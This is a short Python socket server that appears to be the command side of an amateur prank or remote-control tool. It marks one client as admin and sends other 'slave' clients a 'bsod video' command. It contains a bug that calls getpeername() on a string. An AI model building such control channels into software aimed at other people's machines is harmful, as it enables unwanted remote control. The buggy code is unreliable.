import socket
import time

addr = "127.0.0.1"
port = 4560

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((addr, port))
server.listen(3)

adminClient = None
adminDefining = "verify admin"
slaveClient = None

while True:
    client, address = server.accept()
    print(f"Connection from {address[0]}:{address[1]}")

    msg = client.recv(1024)
    msg = msg.decode("utf-8")
    msg = msg.lower()

    if msg == adminDefining:
        adminClient = msg.getpeername()
    else:
        client.send(bytes("bsod video\\mario.mp4 8", "utf-8"))

    print(msg)